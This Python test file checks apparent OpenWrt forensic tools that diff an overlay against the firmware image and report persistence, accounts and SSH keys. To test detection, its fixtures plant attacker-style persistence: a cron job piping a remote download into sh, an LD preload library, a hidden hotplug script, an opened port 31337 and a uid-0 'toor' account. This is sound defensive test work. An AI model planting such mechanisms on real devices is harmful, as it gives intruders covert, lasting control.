"""Forensic tools: overlay_diff, persistence, users_auth.

Fixture: the firmware image is a copy of the container's own system tree at
/fixture/rom (so the live system equals "the image" until a test plants something), and
the overlay's upper directory is built by hand in /dev/shm/fxu. /dev/shm is a tmpfs:
there the container may create the 0/0 character devices that overlayfs uses as
whiteouts, which it may not on its own (overlay) root.
"""

import base64
import hashlib
import re
import struct
import unittest

from mcp_client import OpenWrtTestCase

ROM_DIR = "/fixture/rom"
UPPER_DIR = "/dev/shm/fxu"
ROM = {"MCP_ROM": ROM_DIR}
BOTH = {"MCP_ROM": ROM_DIR, "MCP_UPPER": UPPER_DIR}

MAKE_ROM = f"""
mkdir -p {ROM_DIR}
cp -a /bin /sbin /etc /lib /usr /www {ROM_DIR}/ 2>/dev/null
test -x {ROM_DIR}/bin/busybox && test -f {ROM_DIR}/etc/passwd
"""

MAKE_UPPER = f"""
set -e
U={UPPER_DIR}
rm -rf $U
mkdir -p $U/usr/bin $U/usr/lib $U/usr/sbin $U/etc/config $U/etc/init.d $U/etc/rc.d $U/etc/uci-defaults $U/bin
cp /bin/busybox $U/usr/bin/jshn
cp -a /bin/ubus $U/bin/ubus && chmod 4755 $U/bin/ubus
printf '#!/bin/sh\\n' > $U/usr/bin/gl-helper && chmod 755 $U/usr/bin/gl-helper
printf 'data\\n' > $U/usr/lib/notes.txt
cp -a /etc/config/firewall $U/etc/config/firewall && echo '# edit' >> $U/etc/config/firewall
cp -a /etc/banner $U/etc/banner
printf '#!/bin/sh /etc/rc.common\\n' > $U/etc/init.d/gl_helper && chmod 755 $U/etc/init.d/gl_helper
ln -s ../init.d/gl_helper $U/etc/rc.d/S99gl_helper
cp -a /etc/passwd $U/etc/passwd && echo 'toor:x:0:0::/root:/bin/ash' >> $U/etc/passwd
# whiteouts: a deleted image program, and a first-boot script that removed itself
if mknod $U/usr/sbin/uhttpd c 0 0 2>/dev/null; then
    mknod $U/etc/uci-defaults/$(ls /etc/uci-defaults | head -n 1) c 0 0
    echo yes
else
    echo no
fi
"""


def ssh_string(b: bytes) -> bytes:
    return struct.pack(">I", len(b)) + b


def fingerprint(blob: bytes) -> str:
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


ED_BLOB = ssh_string(b"ssh-ed25519") + ssh_string(bytes(range(32)))
RSA_N = (1 << 2047) | 0x1234567
RSA_BLOB = ssh_string(b"ssh-rsa") + ssh_string(b"\x01\x00\x01") + ssh_string(b"\x00" + RSA_N.to_bytes(256, "big"))
ED_LINE = "ssh-ed25519 " + base64.b64encode(ED_BLOB).decode() + " admin@laptop"
RSA_LINE = 'no-pty,command="/bin/true" ssh-rsa ' + base64.b64encode(RSA_BLOB).decode() + " backup job"


class Fixture(OpenWrtTestCase):
    SETUP = ""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        if cls.container is None:
            raise unittest.SkipTest("needs a container")
        try:
            cls.container.sh(MAKE_ROM)
            cls.setup_out = cls.container.sh(cls.SETUP) if cls.SETUP else ""
        except BaseException:
            cls.tearDownClass()
            raise


class TestOverlayDiff(Fixture):
    SETUP = MAKE_UPPER

    @property
    def whiteouts(self):
        return self.setup_out.strip().endswith("yes")

    def entries(self, text):
        out = {}
        for ln in text.splitlines():
            m = re.match(r"^P(\d) (\S+)\s+(.*)  \[(.*)\]$", ln)
            if m:
                path = re.search(r"(/\S+)( -> \S+)?$", m.group(3)).group(1)
                out[path] = {"prio": int(m.group(1)), "status": m.group(2), "meta": m.group(3), "why": m.group(4)}
        return out

    def test_without_overlay_explains(self):
        text = self.tool_ok("overlay_diff")
        self.assertIn("No overlay found", text)
        self.assertIn("no usable firmware image", text)
        text = self.tool_ok("overlay_diff", ROM)
        self.assertIn("No overlay found", text)
        self.assertIn("is usable", text)

    def test_classification(self):
        e = self.entries(self.tool_ok("overlay_diff", BOTH))
        want = {
            "/usr/bin/jshn": (1, "changed", "image file replaced"),
            "/bin/ubus": (1, "mode", "setuid or setgid bit set"),
            "/usr/bin/gl-helper": (2, "added", "program not in the image, no package owns it"),
            "/etc/init.d/gl_helper": (2, "added", "autostart entry not in the image (init)"),
            "/usr/lib/notes.txt": (3, "added", "file not in the image"),
            "/etc/passwd": (3, "changed", "accounts changed"),
            "/etc/rc.d/S99gl_helper": (4, "added", "service enabled or disabled"),
            "/etc/config/firewall": (5, "changed", "expected"),
            "/etc/banner": (5, "same", "identical to the image"),
        }
        for path, (prio, status, why) in want.items():
            self.assertIn(path, e)
            self.assertEqual((e[path]["prio"], e[path]["status"]), (prio, status), path)
            self.assertIn(why, e[path]["why"], path)
        self.assertIn("package jshn (image)", e["/usr/bin/jshn"]["why"])
        self.assertIn("image: mode 0755", e["/bin/ubus"]["why"])
        self.assertRegex(e["/usr/bin/jshn"]["meta"], r"^f 0755 root:root +\d+ \d{4}-\d\d-\d\d \d\d:\d\d:\d\d /usr")
        # plain directories that the image has too are not entries
        self.assertNotIn("/usr/bin", e)
        self.assertNotIn("/etc", e)

    def test_whiteouts(self):
        if not self.whiteouts:
            self.skipTest("this container cannot create 0/0 character devices")
        e = self.entries(self.tool_ok("overlay_diff", BOTH))
        self.assertEqual((e["/usr/sbin/uhttpd"]["prio"], e["/usr/sbin/uhttpd"]["status"]), (2, "deleted"))
        self.assertIn("image file deleted", e["/usr/sbin/uhttpd"]["why"])
        first_boot = [p for p in e if p.startswith("/etc/uci-defaults/")]
        self.assertEqual(len(first_boot), 1)
        self.assertEqual((e[first_boot[0]]["prio"], e[first_boot[0]]["status"]), (5, "deleted"))
        only = self.entries(self.tool_ok("overlay_diff", BOTH, status="deleted"))
        self.assertEqual(set(only), {"/usr/sbin/uhttpd", first_boot[0]})

    def test_ordered_by_priority(self):
        text = self.tool_ok("overlay_diff", BOTH)
        prios = [int(p) for p in re.findall(r"^P(\d) ", text, flags=re.M)]
        self.assertEqual(prios, sorted(prios))
        self.assertGreaterEqual(len(prios), 9)
        self.assertRegex(text, r"entries: \d+  \(added 4, changed 3, mode/owner 1,")

    def test_filters(self):
        e = self.entries(self.tool_ok("overlay_diff", BOTH, path="/usr/bin"))
        self.assertEqual(set(e), {"/usr/bin/jshn", "/usr/bin/gl-helper"})
        e = self.entries(self.tool_ok("overlay_diff", BOTH, max_priority=1))
        self.assertEqual(set(e), {"/usr/bin/jshn", "/bin/ubus"})
        e = self.entries(self.tool_ok("overlay_diff", BOTH, status="changed"))
        self.assertEqual(set(e), {"/usr/bin/jshn", "/bin/ubus", "/etc/passwd", "/etc/config/firewall"})
        e = self.entries(self.tool_ok("overlay_diff", BOTH, status="unchanged"))
        self.assertEqual(set(e), {"/etc/banner"})
        self.assertIn("no entries", self.tool_ok("overlay_diff", BOTH, path="/www"))
        text, err = self.tool("overlay_diff", BOTH, status="weird")
        self.assertTrue(err)

    def test_paging(self):
        first = self.tool_ok("overlay_diff", BOTH, max_results=2)
        self.assertEqual(len(self.entries(first)), 2)
        self.assertRegex(first, r"\[entries 1-2 of \d+ matching; continue with offset=2\]")
        second = self.tool_ok("overlay_diff", BOTH, max_results=2, offset=2)
        self.assertEqual(len(self.entries(second)), 2)
        self.assertFalse(set(self.entries(first)) & set(self.entries(second)))

    def test_package_upgrade_lowers_priority(self):
        # make the installed jshn look newer than the image's: then the replaced
        # program is explained (priority 3), and the output says the database can lie
        self.sh("""cp -a /usr/lib/opkg/status /tmp/status.bak 2>/dev/null; cp -a /lib/apk/db/installed /tmp/installed.bak 2>/dev/null
            [ -f /usr/lib/opkg/status ] && sed -i '/^Package: jshn$/,/^$/ s/^Version: .*/Version: 9.9.9-r1/' /usr/lib/opkg/status
            [ -f /lib/apk/db/installed ] && sed -i '/^P:jshn$/,/^$/ s/^V:.*/V:9.9.9-r1/' /lib/apk/db/installed
            true""")
        try:
            e = self.entries(self.tool_ok("overlay_diff", BOTH))
            self.assertEqual(e["/usr/bin/jshn"]["prio"], 3)
            self.assertIn("replaced by an upgrade of package jshn", e["/usr/bin/jshn"]["why"])
            self.assertIn("9.9.9-r1", e["/usr/bin/jshn"]["why"])
            self.assertIn("a hint, not proof", e["/usr/bin/jshn"]["why"])
        finally:
            self.sh("""[ -f /tmp/status.bak ] && cp -a /tmp/status.bak /usr/lib/opkg/status
                [ -f /tmp/installed.bak ] && cp -a /tmp/installed.bak /lib/apk/db/installed; true""")

    def test_finds_the_upper_dir_of_gl_inet_models(self):
        self.sh("mkdir -p /userdata/overlay/upper/etc && echo x > /userdata/overlay/upper/etc/dropped")
        try:
            text = self.tool_ok("overlay_diff", ROM)
            self.assertIn("overlay /userdata/overlay/upper against image", text)
            self.assertIn("/etc/dropped", text)
        finally:
            self.sh("rm -rf /userdata")

    def test_overlay_without_image(self):
        text = self.tool_ok("overlay_diff", {"MCP_UPPER": UPPER_DIR})
        self.assertIn("no usable firmware image", text)
        self.assertIn("/usr/bin/gl-helper", text)


class TestPersistenceClean(Fixture):
    def test_everything_equals_the_image(self):
        text = self.tool_ok("persistence", ROM).split("\n", 1)[1]  # without the legend
        self.assertNotIn("[new]", text)
        self.assertNotIn("[CHANGED]", text)
        self.assertNotIn("[meta]", text)
        for loc in ("cron", "rc_local", "init", "inittab", "hotplug", "uci_defaults", "firewall", "dnsmasq",
                    "profile", "preload", "modules", "sysupgrade", "rpcd", "luci", "feeds", "hosts", "ssh_keys"):
            self.assertIn(f"\n== {loc}: ", text)
        self.assertRegex(text, r"\[same\] as in the image, /etc/init\.d \(\d+\):.* dropbear")
        self.assertRegex(text, r"\[same\] as in the image, /etc/rc\.d \(\d+\):.* S\d\ddropbear")
        self.assertIn("[same] /etc/rc.local", text)  # rc.local is always shown

    def test_only_changed_hides_the_image(self):
        text = self.tool_ok("persistence", ROM, only_changed=True).split("\n", 1)[1]
        self.assertNotIn("[same]", text)
        self.assertRegex(text, r"\(\d+ entries, none differs from the image\)")

    def test_without_image_says_so(self):
        text = self.tool_ok("persistence")
        self.assertIn("No usable firmware image", text)
        self.assertNotIn("[same]", text)
        self.assertRegex(text, r"\[-\] present, not compared, /etc/init\.d \(\d+\)")

    def test_arguments(self):
        text = self.tool_ok("persistence", ROM, locations=["cron", "feeds"])
        self.assertEqual(re.findall(r"^== (\w+):", text, flags=re.M), ["cron", "feeds"])
        text, err = self.tool("persistence", ROM, locations=["cron", "nonsense"])
        self.assertTrue(err)
        self.assertIn("unknown location 'nonsense'", text)


class TestPersistencePlanted(Fixture):
    SETUP = r"""
set -e
echo '*/5 * * * * wget -qO- http://203.0.113.5/x | sh' > /etc/crontabs/root
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { /usr/bin/gl-helper & }\n' > /etc/init.d/gl_helper
chmod 755 /etc/init.d/gl_helper
ln -s ../init.d/gl_helper /etc/rc.d/S99gl_helper
echo '/bin/ulogd &' >> /etc/init.d/urandom_seed
printf '# my jobs\n/usr/bin/beacon --password=rcsecret55 &\npassword=rcsecret66\nwget -q http://me:urlsecret77@dyn.example/update\nexit 0\n' > /etc/rc.local
echo /usr/lib/libhide.so > /etc/ld.so.preload
mkdir -p /etc/hotplug.d/iface /etc/profile.d /etc/dropbear
printf '#!/bin/sh\n[ "$ACTION" = ifup ] && /tmp/.cache/up\n' > /etc/hotplug.d/iface/99-up
echo 'alias ls="ls --color"' > /etc/profile.d/x.sh
printf '#!/bin/sh\niptables -I INPUT -p tcp --dport 31337 -j ACCEPT\n' > /root/fw-hook.sh
uci add firewall include >/dev/null
uci set firewall.@include[-1].path=/root/fw-hook.sh
uci commit firewall
seq 1 60 | sed 's/^/job /' > /etc/crontabs/many
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl x@y' > /etc/dropbear/authorized_keys
"""

    def section(self, text, loc):
        m = re.search(rf"^== {loc}: .*?(?=^== |\Z)", text, flags=re.M | re.S)
        self.assertIsNotNone(m, loc)
        return m.group(0)

    def test_each_plant_is_marked_and_shown(self):
        text = self.tool_ok("persistence", ROM)
        cron = self.section(text, "cron")
        self.assertIn("[new] /etc/crontabs/root", cron)
        self.assertIn("*/5 * * * * wget -qO- http://203.0.113.5/x | sh", cron)
        self.assertIn("cron service: enabled", cron)
        init = self.section(text, "init")
        self.assertIn("[new] /etc/init.d/gl_helper", init)
        self.assertIn("start() { /usr/bin/gl-helper & }", init)
        self.assertIn("[new] /etc/rc.d/S99gl_helper -> ../init.d/gl_helper", init)
        self.assertIn("[CHANGED] /etc/init.d/urandom_seed", init)
        self.assertIn("/bin/ulogd &", init)
        self.assertRegex(init, r"urandom_seed .*image: \d+ bytes; package urandom-seed, image")
        self.assertNotIn("[new] /etc/init.d/dropbear", init)
        rc = self.section(text, "rc_local")
        self.assertIn("[CHANGED] /etc/rc.local", rc)
        self.assertIn("/usr/bin/beacon", rc)
        self.assertNotIn("# my jobs", rc)  # comments are skipped
        self.assertIn("[new] /etc/ld.so.preload", self.section(text, "preload"))
        self.assertIn("/usr/lib/libhide.so", self.section(text, "preload"))
        hot = self.section(text, "hotplug")
        self.assertIn("[new] /etc/hotplug.d/iface/99-up", hot)
        self.assertIn("/tmp/.cache/up", hot)
        self.assertIn("[new] /etc/profile.d/x.sh", self.section(text, "profile"))
        fw = self.section(text, "firewall")
        self.assertIn("path='/root/fw-hook.sh'", fw)
        self.assertIn("[new] /root/fw-hook.sh", fw)
        self.assertIn("--dport 31337", fw)
        keys = self.section(text, "ssh_keys")
        self.assertIn("[new] /etc/dropbear/authorized_keys", keys)
        self.assertIn("1 key lines", keys)

    def test_secrets_are_masked(self):
        text = self.tool_ok("persistence", ROM)
        self.assertNotIn("rcsecret66", text)
        self.assertNotIn("rcsecret55", text)
        self.assertNotIn("urlsecret77", text)
        self.assertIn("http://me:<redacted>@dyn.example/update", text)
        self.assertIn("password=<redacted>", text)
        self.assertIn("/usr/bin/beacon --password=<redacted> &", text)
        plain = self.tool_ok("persistence", {"MCP_ROM": ROM_DIR, "MCP_REDACT": "0"})
        self.assertIn("rcsecret66", plain)

    def test_only_changed_and_filter(self):
        text = self.tool_ok("persistence", ROM, only_changed=True, locations=["init", "cron"]).split("\n", 1)[1]
        self.assertIn("[new] /etc/init.d/gl_helper", text)
        self.assertIn("[CHANGED] /etc/init.d/urandom_seed", text)
        self.assertNotIn("[same]", text)
        self.assertNotIn("== hotplug", text)

    def test_line_cap(self):
        text = self.tool_ok("persistence", ROM, locations=["cron"], max_lines=5)
        self.assertIn("job 5\n", text)
        self.assertNotIn("job 6\n", text)
        self.assertIn("[55 more lines; read_file shows the whole file]", text)
        text = self.tool_ok("persistence", ROM, locations=["cron"], max_lines=0)
        self.assertIn("[new] /etc/crontabs/many", text)
        self.assertNotIn("job 1", text)


class TestUsersAuth(Fixture):
    SETUP = rf"""
set -e
echo 'toor:x:0:0:toor:/root:/bin/ash' >> /etc/passwd
echo 'toor:$1$saltsalt$Qm9ndXNIYXNoQm9ndXNIYXNo:19700:0:99999:7:::' >> /etc/shadow
echo 'guest:x:1000:1000:guest:/home/guest:/bin/ash' >> /etc/passwd
echo 'guest::19700:0:99999:7:::' >> /etc/shadow
echo 'svc:x:1001:1001:svc:/var:/bin/false' >> /etc/passwd
echo 'svc:$6$salt$U2hhNTEySGFzaFNoYTUxMkhhc2g:0:0:99999:7:::' >> /etc/shadow
mkdir -p /etc/dropbear /home/guest/.ssh /etc/ssh
cat > /etc/dropbear/authorized_keys <<'EOF'
# my laptop
{ED_LINE}
EOF
cat > /home/guest/.ssh/authorized_keys <<'EOF'
{RSA_LINE}
this is not a key
EOF
uci set dropbear.lanonly=dropbear
uci set dropbear.lanonly.Port=2222
uci set dropbear.lanonly.Interface=lan
uci set dropbear.lanonly.PasswordAuth=off
uci commit dropbear
uci add rpcd login >/dev/null
uci set rpcd.@login[-1].username=api
uci set rpcd.@login[-1].password=plainpw123
uci commit rpcd
printf 'Port 2200\nPermitRootLogin yes\n#PasswordAuthentication no\n' > /etc/ssh/sshd_config
"""

    def test_accounts(self):
        text = self.tool_ok("users_auth", ROM)
        rows = {ln.split()[0]: ln for ln in text.splitlines() if re.match(r"^\w+ +\d+:\d+ ", ln)}
        self.assertRegex(rows["root"], r"EMPTY \(login without one\)")
        self.assertRegex(rows["toor"], r"0:0 .*set, md5crypt +2023-12-09 +UID0,login-shell,not-in-image")
        self.assertRegex(rows["guest"], r"EMPTY .*login-shell,not-in-image")
        self.assertRegex(rows["svc"], r"/bin/false +set, sha512crypt +- +not-in-image")
        self.assertRegex(rows["daemon"], r"none \(no password login\) +- +-$")
        self.assertIn("uid 0 besides root: toor", text)
        self.assertIn("empty passwords: root guest", text)

    def test_never_prints_a_hash(self):
        for env in (ROM, {"MCP_ROM": ROM_DIR, "MCP_REDACT": "0"}):
            text = self.tool_ok("users_auth", env)
            for secret in ("Qm9ndXNIYXNoQm9ndXNIYXNo", "U2hhNTEySGFzaFNoYTUxMkhhc2g", "saltsalt", "plainpw123"):
                self.assertNotIn(secret, text)

    def test_keys_with_fingerprints(self):
        text = self.tool_ok("users_auth", ROM)
        self.assertIn(f'/etc/dropbear/authorized_keys line 2: ssh-ed25519 256 bits  {fingerprint(ED_BLOB)}  '
                      'comment "admin@laptop"  [not in the image]', text)
        self.assertIn(f'/home/guest/.ssh/authorized_keys line 1: ssh-rsa 2048 bits  {fingerprint(RSA_BLOB)}  '
                      'comment "backup job"  options: no-pty,command="/bin/true"  [not in the image]', text)
        self.assertIn("/home/guest/.ssh/authorized_keys line 2: not a key line", text)

    def test_key_in_image_is_marked(self):
        self.sh(f"mkdir -p {ROM_DIR}/etc/dropbear && cp /etc/dropbear/authorized_keys {ROM_DIR}/etc/dropbear/")
        try:
            self.assertIn("[in the image]", self.tool_ok("users_auth", ROM))
        finally:
            self.sh(f"rm -f {ROM_DIR}/etc/dropbear/authorized_keys")

    def test_ssh_and_web_settings(self):
        text = self.tool_ok("users_auth", ROM)
        self.assertRegex(text, r"dropbear dropbear\.\S+: enabled, port 22, interface all, password login on, "
                               r"root password login on, root login on")
        self.assertIn("dropbear dropbear.lanonly: enabled, port 2222, interface lan, password login off", text)
        self.assertIn("Port 2200", text)
        self.assertIn("PermitRootLogin yes", text)
        self.assertNotIn("#PasswordAuthentication", text)
        self.assertRegex(text, r"uhttpd\.main\.listen_http=")
        self.assertIn("username root, password: the system password of user root, read *, write *", text)
        self.assertIn("username api, password: another form, possibly plain text (not shown)", text)
        self.assertIn("LuCI session:", text)

    def test_without_image(self):
        text = self.tool_ok("users_auth")
        self.assertIn("no usable firmware image", text)
        self.assertNotIn("not-in-image", text)
        self.assertNotIn("[not in the image]", text)
        self.assertIn(fingerprint(ED_BLOB), text)


if __name__ == "__main__":
    unittest.main()
